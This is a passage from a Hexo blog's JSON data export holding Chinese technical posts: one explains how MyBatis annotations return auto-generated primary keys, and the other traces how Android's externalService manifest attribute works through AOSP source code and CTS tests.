 void insertOrder(Order order);\n}\n```\n这里的keyProperty表示对象中的成员变量，keyColumn表示数据库中的列名，因此我们这里数据库主键名称就是**id** ，其实此处不写keyColumn也是可以的，因为我们只是读不是写。此外，如果你Order实体中主键名称就叫\"id\"的话，keyProperty也不用写了。\n实体类则如下：\n\n```java\npublic class Order {\n    private long id;\n    ...\n}\n```\n最后通过 **order.getId()** 方法就能拿到生成的主键，注意这里不是通过insertOrder方法的返回值来拿到的，所以我特意写成了void方法，如果写成int类型，返回的值只是表示本次插入是否成功而已（1 or 0）。\n\n#### 用@SelectKey注解\n还是和上面一样：\n\n```java\n@Insert(\"INSERT INTO ...\")\n@SelectKey(statement = \"select last_insert_id()\", keyProperty = \"id\", before = false, resultType = long.class)\nvoid insertOrder(Order order);\n```\n这里的before指的是select语句是否在insert之前执行，显然我们这里需要先写后读，所以是false。\n此外，select last_insert_id()也可以换成 **@@identity** ， 效果一样。\n\n**参考：**\nhttps://www.cnblogs.com/weiyinfu/p/6835301.html#6\nhttps://stackoverflow.com/questions/4283159/how-to-return-ids-on-inserts-with-mybatis-in-mysql-with-annotations\n","source":"_posts/2019-03-17-MyBatis中插入（insert）后返回主键（key）的注解方式.md","raw":"---\nlayout:     post\ntitle:      MyBatis中插入（insert）后返回主键（key）的注解方式\nsubtitle:   那是真的牛逼。\ndate:       2019-03-17\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - 后端\n    - Java\n---\n\n一般我们插入数据后需要知道其自增的主键key是多少，有两种方式：\n#### 用@Options注解：\n比如这里有个订单（Order）相关的DAO：\n\n```java\npublic interface OrderDao {\n    @Insert(\"INSERT INTO ...\")\n    @Options(useGeneratedKeys = true, keyProperty = \"id\", keyColumn = \"id\")\n    void insertOrder(Order order);\n}\n```\n这里的keyProperty表示对象中的成员变量，keyColumn表示数据库中的列名，因此我们这里数据库主键名称就是**id** ，其实此处不写keyColumn也是可以的，因为我们只是读不是写。此外，如果你Order实体中主键名称就叫\"id\"的话，keyProperty也不用写了。\n实体类则如下：\n\n```java\npublic class Order {\n    private long id;\n    ...\n}\n```\n最后通过 **order.getId()** 方法就能拿到生成的主键，注意这里不是通过insertOrder方法的返回值来拿到的，所以我特意写成了void方法，如果写成int类型，返回的值只是表示本次插入是否成功而已（1 or 0）。\n\n#### 用@SelectKey注解\n还是和上面一样：\n\n```java\n@Insert(\"INSERT INTO ...\")\n@SelectKey(statement = \"select last_insert_id()\", keyProperty = \"id\", before = false, resultType = long.class)\nvoid insertOrder(Order order);\n```\n这里的before指的是select语句是否在insert之前执行，显然我们这里需要先写后读，所以是false。\n此外，select last_insert_id()也可以换成 **@@identity** ， 效果一样。\n\n**参考：**\nhttps://www.cnblogs.com/weiyinfu/p/6835301.html#6\nhttps://stackoverflow.com/questions/4283159/how-to-return-ids-on-inserts-with-mybatis-in-mysql-with-annotations\n","slug":"MyBatis中插入（insert）后返回主键（key）的注解方式","published":1,"updated":"2024-03-25T07:31:25.852Z","comments":1,"photos":[],"link":"","_id":"cluaufh0i000mthe61jn47sq8","content":"<p>一般我们插入数据后需要知道其自增的主键key是多少，有两种方式：</p>\n<h4 id=\"用-Options注解：\"><a href=\"#用-Options注解：\" class=\"headerlink\" title=\"用@Options注解：\"></a>用@Options注解：</h4><p>比如这里有个订单（Order）相关的DAO：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">OrderDao</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Insert(&quot;INSERT INTO ...&quot;)</span></span><br><span class=\"line\">    <span class=\"meta\">@Options(useGeneratedKeys = true, keyProperty = &quot;id&quot;, keyColumn = &quot;id&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">insertOrder</span><span class=\"params\">(Order order)</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的keyProperty表示对象中的成员变量，keyColumn表示数据库中的列名，因此我们这里数据库主键名称就是<strong>id</strong> ，其实此处不写keyColumn也是可以的，因为我们只是读不是写。此外，如果你Order实体中主键名称就叫”id”的话，keyProperty也不用写了。<br>实体类则如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Order</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">long</span> id;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最后通过 <strong>order.getId()</strong> 方法就能拿到生成的主键，注意这里不是通过insertOrder方法的返回值来拿到的，所以我特意写成了void方法，如果写成int类型，返回的值只是表示本次插入是否成功而已（1 or 0）。</p>\n<h4 id=\"用-SelectKey注解\"><a href=\"#用-SelectKey注解\" class=\"headerlink\" title=\"用@SelectKey注解\"></a>用@SelectKey注解</h4><p>还是和上面一样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Insert(&quot;INSERT INTO ...&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@SelectKey(statement = &quot;select last_insert_id()&quot;, keyProperty = &quot;id&quot;, before = false, resultType = long.class)</span></span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">insertOrder</span><span class=\"params\">(Order order)</span>;</span><br></pre></td></tr></table></figure>\n<p>这里的before指的是select语句是否在insert之前执行，显然我们这里需要先写后读，所以是false。<br>此外，select last_insert_id()也可以换成 <strong>@@identity</strong> ， 效果一样。</p>\n<p><strong>参考：</strong><br><a href=\"https://www.cnblogs.com/weiyinfu/p/6835301.html#6\">https://www.cnblogs.com/weiyinfu/p/6835301.html#6</a><br><a href=\"https://stackoverflow.com/questions/4283159/how-to-return-ids-on-inserts-with-mybatis-in-mysql-with-annotations\">https://stackoverflow.com/questions/4283159/how-to-return-ids-on-inserts-with-mybatis-in-mysql-with-annotations</a></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>一般我们插入数据后需要知道其自增的主键key是多少，有两种方式：</p>\n<h4 id=\"用-Options注解：\"><a href=\"#用-Options注解：\" class=\"headerlink\" title=\"用@Options注解：\"></a>用@Options注解：</h4><p>比如这里有个订单（Order）相关的DAO：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">OrderDao</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Insert(&quot;INSERT INTO ...&quot;)</span></span><br><span class=\"line\">    <span class=\"meta\">@Options(useGeneratedKeys = true, keyProperty = &quot;id&quot;, keyColumn = &quot;id&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">insertOrder</span><span class=\"params\">(Order order)</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的keyProperty表示对象中的成员变量，keyColumn表示数据库中的列名，因此我们这里数据库主键名称就是<strong>id</strong> ，其实此处不写keyColumn也是可以的，因为我们只是读不是写。此外，如果你Order实体中主键名称就叫”id”的话，keyProperty也不用写了。<br>实体类则如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Order</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">long</span> id;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最后通过 <strong>order.getId()</strong> 方法就能拿到生成的主键，注意这里不是通过insertOrder方法的返回值来拿到的，所以我特意写成了void方法，如果写成int类型，返回的值只是表示本次插入是否成功而已（1 or 0）。</p>\n<h4 id=\"用-SelectKey注解\"><a href=\"#用-SelectKey注解\" class=\"headerlink\" title=\"用@SelectKey注解\"></a>用@SelectKey注解</h4><p>还是和上面一样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Insert(&quot;INSERT INTO ...&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@SelectKey(statement = &quot;select last_insert_id()&quot;, keyProperty = &quot;id&quot;, before = false, resultType = long.class)</span></span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">insertOrder</span><span class=\"params\">(Order order)</span>;</span><br></pre></td></tr></table></figure>\n<p>这里的before指的是select语句是否在insert之前执行，显然我们这里需要先写后读，所以是false。<br>此外，select last_insert_id()也可以换成 <strong>@@identity</strong> ， 效果一样。</p>\n<p><strong>参考：</strong><br><a href=\"https://www.cnblogs.com/weiyinfu/p/6835301.html#6\">https://www.cnblogs.com/weiyinfu/p/6835301.html#6</a><br><a href=\"https://stackoverflow.com/questions/4283159/how-to-return-ids-on-inserts-with-mybatis-in-mysql-with-annotations\">https://stackoverflow.com/questions/4283159/how-to-return-ids-on-inserts-with-mybatis-in-mysql-with-annotations</a></p>\n"},{"layout":"post","title":"源码茶舍之android:externalService是什么属性？实现原理？","subtitle":"品味AOSP。","date":"2019-04-09T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 发现\n\n在AndroidManifest中声明Service时，偶然发现一个布尔类型的属性：`android:externalService`\n示例如下：\n\n```xml\n<service\n    android:externalService=\"true\"\n    ... />\n```\n\n如果minSDK小于24，会显示警告，很显然这是一个24以后的新东西。\n先顾名思义一下，external的service，外置（外挂）的服务？它和 `android:exported` 以及 `android:isolatedProcess` 属性是什么关系？\n\n## 初探\n\n先谷歌一下，再百度一下，无果。竟然没有一个人解释这是什么东西，这更加激发了我的好奇心。\n马上去Android官网搜，搜到service标签的文档，心中窃喜：\nhttps://developer.android.com/guide/topics/manifest/service-element\n翻完整个文档，发现居然也没有 `android:externalService` 的说明，难道是太新了忘了补充文档吗？\n不过我们可以从中先复习一下 `android:exported` 以及 `android:isolatedProcess` 属性：\n\n##### exported\n\n> Whether or not components of other applications can invoke the service or interact with it — \"true\" if they can, and \"false\" if not. When the value is \"false\", only components of the same application or applications with the same user ID can start the service or bind to it.\n> The default value depends on whether the service contains intent filters. The absence of any filters means that it can be invoked only by specifying its exact class name. This implies that the service is intended only for application-internal use (since others would not know the class name). So in this case, the default value is \"false\". On the other hand, the presence of at least one filter implies that the service is intended for external use, so the default value is \"true\".\n> This attribute is not the only way to limit the exposure of a service to other applications. You can also use a permission to limit the external entities that can interact with the service (see the [permission](https://developer.android.com/guide/topics/manifest/service-element.html#prmsn) attribute).\n\n其实这个属性大家也是耳熟能详了，从官网解释来看，主要就是限制该Service能否被其他应用调用。\n同时，还特意解释了默认值的决定情况，即你不需要总是显式地声明此属性。\n\n- 如果service标签下没有添加任何intent-filter，那么就默认为false，即不对外暴露，因为这种情况下其他应用不知道你的Service类名，当然就只能内部调用了（我觉得谷歌这个解释有点牵强，因为即便你知道包名和类名，但exported为false的话，你也调不了）\n- 如果添加了至少一个能让外部调用的filter标签（比如action什么的），那么默认值就是true了。\n\n最后，还提醒了此属性不是唯一一种限制外部调用的途径，permission也可以。\n\n##### isolatedProcess\n\n> If set to true, this service will run under a special process that is isolated from the rest of the system and has no permissions of its own. The only communication with it is through the Service API (binding and starting).\n\n这个比较简单，顾名思义也知道是让Service独立运行到一个特定进程中。\n\n## 挖掘\n\n既然搜也搜不到，官网也藏着掖着，那就只能我们自己挖掘了。这怎么少得了Read the fucking code呢？\n这就要从系统启动App并解析Manifest文件开始说起了，我们只简要地分析一下：\n1、SystemServer进程启动**PackageManagerService**（PMS）服务；\n2、PMS扫描文件目录的过程，会调用到**scanPackageLI**方法，此方法中会实例化**PackageParser**，这是关键；\n3、PackageParser会解析Manifest中的各种标签，其中**parseService**便是解析service的。\n\n来看看parseService方法的代码，长得一匹，得精简一下：\n\n```java\nprivate Service parseService(Package owner, Resources res,\n        XmlResourceParser parser, int flags, String[] outError,\n        CachedComponentArgs cachedArgs)\n        throws XmlPullParserException, IOException {\n    TypedArray sa = res.obtainAttributes(parser,\n            com.android.internal.R.styleable.AndroidManifestService);\n\n    ...\n\n    Service s = new Service(cachedArgs.mServiceArgs, new ServiceInfo());\n    ...\n    // exported的解析\n    boolean setExported = sa.hasValue(\n            com.android.internal.R.styleable.AndroidManifestService_exported);\n    if (setExported) {\n        s.info.exported = sa.getBoolean(\n                com.android.internal.R.styleable.AndroidManifestService_exported, false);\n    }\n\n    ...\n\n    s.info.flags = 0;\n    ...\n    // isolatedProcess的解析\n    if (sa.getBoolean(\n            com.android.internal.R.styleable.AndroidManifestService_isolatedProcess,\n            false)) {\n        s.info.flags |= ServiceInfo.FLAG_ISOLATED_PROCESS;\n    }\n    // externalService的解析看这里！\n    if (sa.getBoolean(\n            com.android.internal.R.styleable.AndroidManifestService_externalService,\n            false)) {\n        // 等我们去看看这个FLAG的注释就知道是干啥的了\n        s.info.flags |= ServiceInfo.FLAG_EXTERNAL_SERVICE;\n    }\n    ...\n\n    sa.recycle();\n\n    ...\n\n    int outerDepth = parser.getDepth();\n    int type;\n    while ((type=parser.next()) != XmlPullParser.END_DOCUMENT\n           && (type != XmlPullParser.END_TAG\n                   || parser.getDepth() > outerDepth)) {\n        if (type == XmlPullParser.END_TAG || type == XmlPullParser.TEXT) {\n            continue;\n        }\n\n        if (parser.getName().equals(\"intent-filter\")) {\n            ServiceIntentInfo intent = new ServiceIntentInfo(s);\n            ...\n            s.intents.add(intent); // 注意这里的intents集合\n        } else if (parser.getName().equals(\"meta-data\")) {\n            ...\n        } else {\n            ...\n        }\n    }\n\n    if (!setExported) {\n        // 这儿有个小发现，正好验证了我们上述的官方文档复习\n        // 若开发者没有显式地设置exported属性，且intent-filter标签数量大于0时，exported自动就赋值为true了\n        s.info.exported = s.intents.size() > 0;\n    }\n\n    return s;\n}\n```\n\n接着我打开了ServiceInfo文件，总算是找到了官方解释：\n\n```java\n/**\n * Bit in {@link #flags}: If set, the service can be bound and run in the\n * calling application's package, rather than the package in which it is\n * declared.  Set from {@link android.R.attr#externalService} attribute.\n */\npublic static final int FLAG_EXTERNAL_SERVICE = 0x0004;\n```\n\n顺便，我发现Context源码中也新增了一个bindService的flag：\n\n```java\n/**\n * Flag for {@link #bindService}: The service being bound is an\n * {@link android.R.attr#isolatedProcess isolated},\n * {@link android.R.attr#externalService external} service.  This binds the service into the\n * calling application's package, rather than the package in which the service is declared.\n * <p>\n * When using this flag, the code for the service being bound will execute under the calling\n * application's package name and user ID.  Because the service must be an isolated process,\n * it will not have direct access to the application's data, though.\n *\n * The purpose of this flag is to allow applications to provide services that are attributed\n * to the app using the service, rather than the application providing the service.\n * </p>\n */\npublic static final int BIND_EXTERNAL_SERVICE = 0x80000000;\n```\n\n结合这俩来看，就非常明白了。稍作总结一下：\n1、声明externalService为true就是让该Service可以绑定并运行在调用方的App中，而不是在声明这个Service的App中，这和我们最开始猜测的外置服务之意相符；\n2、注释还进一步说明，此Service还同时须要设置isolatedProcess为true；\n3、此Service的业务代码会在调用方App的包名环境下执行，因为它已经是独立进程（isolated process）了，从声明它的App那儿离家出走，改名换姓；\n4、当然，此Service不能直接访问调用方App的数据；\n5、目的是想从概念上分离Service提供方和使用方这二者（这是我个人理解）。\n\n## 再挖\n\n经过上述初步挖掘，我们算是搞清楚了externalService这个属性的含义和作用，但依然有一些疑惑。比如：\n具体使用一定要带BIND_EXTERNAL_SERVICE这个flag吗？\n只把isolatedProcess和externalService设为true就能用了吗？\n\n要解决这些疑惑，有两个办法，一是自己去尝试，二是再次Read the fucking code！想不到吧？\n先给出源码地址：https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice\n其实这是CTS测试用到的单元测试代码，我们可以从单元测试项来看看有哪些重要的注意点。\n这里具体只需要关注 [service/AndroidManifest.xml](https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice/service/AndroidManifest.xml) 和 [src/ExternalServiceTest.java](https://android.googlesource.com/platform/cts/+/master/tests/tests/externalservice/src/android/externalservice/cts/ExternalServiceTest.java) 这两个文件即可。\n\n从单元测试的Manifest中我们可以了解到几种主要的失败情况：\n1、没有把exported设成true：\n\n```xml\n<service android:name=\".ExternalNonExportedService\"\n         android:isolatedProcess=\"true\"\n         android:externalService=\"true\"\n         android:exported=\"false\"/>\n```\n\n就对应这个错误用例：\n\n```java\n/** Tests that BIND_EXTERNAL_SERVICE requires that an externalService be exported. */\npublic void testFailBindExternalNonExported() {\n    Intent intent = new Intent();\n    intent.setComponent(\n            new ComponentName(sServicePackage, sServicePackage+\".ExternalNonExportedService\"));\n    try {\n        getContext().bindService(intent, mConnection,\n                Context.BIND_AUTO_CREATE | Context.BIND_EXTERNAL_SERVICE);\n        fail(\"Should not be able to BIND_EXTERNAL_SERVICE to non-exported service\");\n    } catch (SecurityException e) {\n    }\n}\n```\n\n**所以，exported也要同时设成true才行。**\n2、没有把isolatedProcess设成true：\n\n```xml\n<service android:name=\".ExternalNonIsolatedService\"\n         android:isolatedProcess=\"false\"\n         android:externalService=\"true\"\n         android:exported=\"true\"/>\n```\n\n就对应此错误：\n\n```java\n/** Tests that BIND_EXTERNAL_SERVICE requires the service be an isolatedProcess. */\npublic void testFailBindExternalNonIsolated() {\n    ...\n        fail(\"Should not be able to BIND_EXTERNAL_SERVICE to non-isolated service\");\n    ...\n}\n```\n\n3、**没有用BIND_EXTERNAL_SERVICE进行绑定也是不行的**：\n\n```java\n/** Tests that an externalService can only be bound with BIND_EXTERNAL_SERVICE. */\npublic void testFailBindWithoutBindExternal() {\n    Intent intent = new Intent();\n    intent.setComponent(new ComponentName(sServicePackage, sServicePackage+\".ExternalService\"));\n    try {\n        getContext().bindService(intent, mConnection, Context.BIND_AUTO_CREATE);\n        fail(\"Should not be able to bind to an external service without BIND_EXTERNAL_SERVICE\");\n    } catch (SecurityException e) {\n    }\n}\n```\n\n因此，最后正确的用法必须是这样声明：\n\n```xml\n<service\n    android:name=\".XXXService\"\n    android:exported=\"true\"\n    android:externalService=\"true\"\n    android:isolatedProcess=\"true\" />\n```\n\n同时通过：\n\n```java\nbindService(intent, mConnection, Context.BIND_AUTO_CREATE | Context.BIND_EXTERNAL_SERVICE);\n```\n\n进行绑定，BIND_EXTERNAL_SERVICE是必须，其余flag根据自己需要决定。\n\n## 后话\n\n我专门搜了下AOSP的代码提交记录，发现这个功能3年前就开发好了，链接如下：\nhttps://android.googlesource.com/platform/frameworks/base/+/b9a8666eb5504f022343fef9087135b7d937ddf8%5E%21/\nCommit信息：\n\n```\nAdd external services, a way to run isolated processes as a different package.\n\nThis adds android:externalService boolean attribute to <service>. If that\nattribute is true, then bindService() may be called with\nBIND_EXTERNAL_SERVICE to create the new service process under the calling\npackage's name and uid. The service will execute the code from the package in\nwhich it is declared, but will appear to run as the calling application.\n\nExternal services may only be used if android:exported=\"false\" and\nandroid:isolatedProcess=\"true\".\n\nBug: 22084679\nBug: 21643067\nChange-Id: I3c3a5f0ef58738316c5efeab9044e43e09220d01\n```\n\n改动也不多，就这么几个文件：\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20190410235236156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n其中最重要的逻辑就在ActiveServices当中，很长的方法，此处只保留关键新增部分：\n\n```java\nprivate ServiceLookupResult retrieveServiceLocked(Intent service,\n        String resolvedType, String callingPackage, int callingPid, int callingUid, int userId,\n        boolean createIfNeeded, boolean callingFromFg, boolean isBindExternal,\n        boolean allowInstant) {\n    ServiceRecord r = null;\n    ...\n            ComponentName name = new ComponentName(\n                    sInfo.applicationInfo.packageName, sInfo.name);\n            if ((sInfo.flags & ServiceInfo.FLAG_EXTERNAL_SERVICE) != 0) { // 先验证flag，即对应externalService属性是否为true\n                if (isBindExternal) { // isBindExternal表示是否是通过BIND_EXTERNAL_SERVICE绑定服务\n                    if (!sInfo.exported) {\n                    \t// 你看，exported必须也是true，否则直接丢你一脸异常\n                        throw new SecurityException(\"BIND_EXTERNAL_SERVICE failed, \" + name +\n                                \" is not exported\");\n                    }\n                    if ((sInfo.flags & ServiceInfo.FLAG_ISOLATED_PROCESS) == 0) {\n                    \t// isolatedProcess也必须true\n                        throw new SecurityException(\"BIND_EXTERNAL_SERVICE failed, \" + name +\n                                \" is not an isolatedProcess\");\n                    }\n                    // Run the service under the calling package's application.\n                    // （这里是源码注释，即下面的代码就是如何让调用方App拥有这个外置Service）\n                    ApplicationInfo aInfo = AppGlobals.getPackageManager().getApplicationInfo(\n                            callingPackage, ActivityManagerService.STOCK_PM_FLAGS, userId);\n                    if (aInfo == null) {\n                        throw new SecurityException(\"BIND_EXTERNAL_SERVICE failed, \" +\n                                \"could not resolve client package \" + callingPackage);\n                    }\n                    // 其实就是重新设置了一遍ServiceInfo，让此Service改名换姓\n                    sInfo = new ServiceInfo(sInfo);\n                    sInfo.applicationInfo = new ApplicationInfo(sInfo.applicationInfo);\n                    sInfo.applicationInfo.packageName = aInfo.packageName;\n                    sInfo.applicationInfo.uid = aInfo.uid;\n                    name = new ComponentName(aInfo.packageName, name.getClassName());\n                    service.setComponent(name);\n                } else {\n                    throw new SecurityException(\"BIND_EXTERNAL_SERVICE required for \" +\n                            name);\n                }\n            } else if (isBindExternal) {\n                throw new SecurityException(\"BIND_EXTERNAL_SERVICE failed, \" + name +\n                        \" is not an externalService\");\n            }\n\t...\n}\n```\n","source":"_posts/2019-04-10-源码茶舍之android-externalService是什么属性？实现原理？.md","raw":"---\nlayout:     post\ntitle:      源码茶舍之android:externalService是什么属性？实现原理？\nsubtitle:   品味AOSP。\ndate:       2019-04-10\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n## 发现\n\n在AndroidManifest中声明Service时，偶然发现一个布尔类型的属性：`android:externalService`\n示例如下：\n\n```xml\n<service\n    android:externalService=\"true\"\n    ... />\n```\n\n如果minSDK小于24，会显示警告，很显然这是一个24以后的新东西。\n先顾名思义一下，external的service，外置（外挂）的服务？它和 `android:exported` 以及 `android:isolatedProcess` 属性是什么关系？\n\n## 初探\n\n先谷歌一下，再百度一下，无果。竟然没有一个人解释这是什么东西，这更加激发了我的好奇心。\n马上去Android官网搜，搜到service标签的文档，心中窃喜：\nhttps://developer.android.com/guide/topics/manifest/service-element\n翻完整个文档，发现居然也没有 `android:externalService` 的说明，难道是太新了忘了补充文档吗？\n不过我们可以从中先复习一下 `android:exported` 以及 `android:isolatedProcess` 属性：\n\n##### exported\n\n> Whether or not components of other applications can invoke the service or interact with it — \"true\" if they can, and \"false\" if not. When the value is \"false\", only components of the same application or applications with the same user ID can start the service or bind to it.\n> The default value depends on whether the service contains intent filters. The absence of any filters means that it can be invoked only by specifying its exact class name. This implies that the service is intended only for application-internal use (since others would not know the class name). So in this case, the default value is \"false\". On the other hand, the presence of at least one filter implies that the service is intended for external use, so the default value is \"true\".\n> This attribute is not the only way to limit the exposure of a service to other applications. You can also use a permission to limit the external entities that can interact with the service (see the [permission](https://developer.android.com/guide/topics/manifest/service-element.html#prmsn) attribute).\n\n其实这个属性大家也是耳熟能详了，从官网解释来看，主要就是限制该Service能否被其他应用调用。\n同时，还特意解释了默认值的决定情况，即你不需要总是显式地声明此属性。\n\n- 如果service标签下没有添加任何intent-filter，那么就默认为false，即不对外暴露，因为这种情况下其他应用不知道你的Service类名，当然就只能内部调用了（我觉得谷歌这个解释有点牵强，因为即便你知道包名和类名，但exported为false的话，你也调不了）\n- 如果添加了至少一个能让外部调用的filter标签（比如action什么的），那么默认值就是true了。\n\n最后，还提醒了此属性不是唯一一种限制外部调用的途径，permission也可以。\n\n##### isolatedProcess\n\n> If set to true, this service will run under a special process that is isolated from the rest of the system and has no permissions of its own. The only communication with it is through the Service API (binding and starting).\n\n这个比较简单，顾名思义也知道是让Service独立运行到一个特定进程中。\n\n## 挖掘\n\n既然搜也搜不到，官网也藏着掖着，那就只能我们自己挖掘了。这怎么少得了Read the fucking code呢？\n这就要从系统启动App并解析Manifest文件开始说起了，我们只简要地分析一下：\n1、SystemServer进程启动**PackageManagerService**（PMS）服务；\n2、PMS扫描文件目录的过程，会调用到**scanPackageLI**方法，此方法中会实例化**PackageParser**，这是关键；\n3、PackageParser会解析Manifest中的各种标签，其中**parseService**便是解析service的。\n\n来看看parseService方法的代码，长得一匹，得精简一下：\n\n```java\nprivate Service parseService(Package owner, Resources res,\n        XmlResourceParser parser, int flags, String[] outError,\n        CachedComponentArgs cachedArgs)\n        throws XmlPullParserException, IOException {\n    TypedArray sa = res.obtainAttributes(parser,\n            com.android.internal.R.styleable.AndroidManifestService);\n\n    ...\n\n    Service s = new Service(cachedArgs.mServiceArgs, new ServiceInfo());\n    ...\n    // exported的解析\n    boolean setExported = sa.hasValue(\n            com.android.internal.R.styleable.AndroidManifestService_exported);\n    if (setExported) {\n        s.info.exported = sa.getBoolean(\n                com.android.internal.R.styleable.AndroidManifestService_exported, false);\n    }\n\n    ...\n\n    s.info.flags = 0;\n    ...\n    // isolatedProcess的解析\n    if (sa.getBoolean(\n            com.android.internal.R.styleable.AndroidManifestService_isolatedProcess,\n            false)) {\n        s.info.flags |= ServiceInfo.FLAG_ISOLATED_PROCESS;\n    }\n    // externalService的解析看这里！\n    if (sa.getBoolean(\n            com.android.internal.R.styleable.AndroidManifestService_externalService,\n            false)) {\n        // 等我们去看看这个FLAG的注释就知道是干啥的了\n        s.info.flags |= ServiceInfo.FLAG_EXTERNAL_SERVICE;\n    }\n    ...\n\n    sa.recycle();\n\n    ...\n\n    int outerDepth = parser.getDepth();\n    int type;\n    while ((type=parser.next()) != XmlPullParser.END_DOCUMENT\n           && (type != XmlPullParser.END_TAG\n                   || parser.getDepth() > outerDepth)) {\n        if (type == XmlPullParser.END_TAG || type == XmlPullParser.TEXT) {\n            continue;\n        }\n\n        if (parser.getName().equals(\"intent-filter\")) {\n            ServiceIntentInfo intent = new ServiceIntentInfo(s);\n            ...\n            s.intents.add(intent); // 注意这里的intents集合\n        } else if (parser.getName().equals(\"meta-data\")) {\n            ...\n        } else {\n            ...\n        }\n    }\n\n    if (!setExported) {\n        // 这儿有个小发现，正好验证了我们上述的官方文档复习\n        // 若开发者没有显式地设置exported属性，且intent-filter标签数量大于0时，exported自动就赋值为true了\n        s.info.exported = s.intents.size() > 0;\n    }\n\n    return s;\n}\n```\n\n接着我打开了ServiceInfo文件，总算是找到了官方解释：\n\n```java\n/**\n * Bit in {@link #flags}: If set, the service can be bound and run in the\n * calling application's package, rather than the package in which it is\n * declared.  Set from {@link android.R.attr#externalService} attribute.\n */\npublic static final int FLAG_EXTERNAL_SERVICE = 0x0004;\n```\n\n顺便，我发现Context源码中也新增了一个bindService的flag：\n\n```java\n/**\n * Flag for {@link #bindService}: The service being bound is an\n * {@link android.R.attr#isolatedProcess isolated},\n * {@link android.R.attr#externalService external} service.  This binds the service into the\n * calling application's package, rather than the package in which the service is declared.\n * <p>\n * When using this flag, the code for the service being bound will execute under the calling\n * application's package name and user ID.  Because the service must be an isolated process,\n * it will not have direct access to the application's data, though.\n *\n * The purpose of this flag is to allow applications to provide services that are attributed\n * to the app using the service, rather than the application providing the service.\n * </p>\n */\npublic static final int BIND_EXTERNAL_SERVICE = 0x80000000;\n```\n\n结合这俩来看，就非常明白了。稍作总结一下：\n1、声明externalService为true就是让该Service可以绑定并运行在调用方的App中，而不是在声明这个Service的App中，这和我们最开始猜测的外置服务之意相符；\n2、注释还进一步说明，此Service还同时须要设置isolatedProcess为true；\n3、此Service的业务代码会在调用方App的包名环境下执行，因为它已经是独立进程（isolated process）了，从声明它的App那儿离家出走，改名换姓；\n4、当然，此Service不能直接访问调用方App的数据；\n5、目的是想从概念上分离Service提供方和使用方这二者（这是我个人理解）。\n\n## 再挖\n\n经过上述初步挖掘，我们算是搞清楚了externalService这个属性的含义和作用，但依然有一些疑惑。比如：\n具体使用一定要带BIND_EXTERNAL_SERVICE这个flag吗？\n只把isolatedProcess和externalService设为true就能用了吗？\n\n要解决这些疑惑，有两个办法，一是自己去尝试，二是再次Read the fucking 